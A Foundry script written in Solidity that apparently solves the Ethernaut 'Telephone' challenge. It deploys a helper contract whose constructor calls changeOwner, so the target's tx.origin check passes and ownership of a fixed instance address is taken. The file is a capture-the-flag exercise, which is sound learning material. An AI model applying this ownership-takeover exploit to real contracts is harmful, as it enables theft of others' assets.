// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";

contract Player {
    constructor(Telephone _instance) {
        console.log("msg.sender: %s", msg.sender);
        _instance.changeOwner(msg.sender);
    }
}

contract Level4TelephoneSolution is Script {
    Telephone public instance = Telephone(0x7aAc812c26464fc2c8eFfcfD11e7Aa7a3e99cc9d);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(instance);
        console.log("owner: %s", instance.owner());
        vm.stopBroadcast();
    }
}
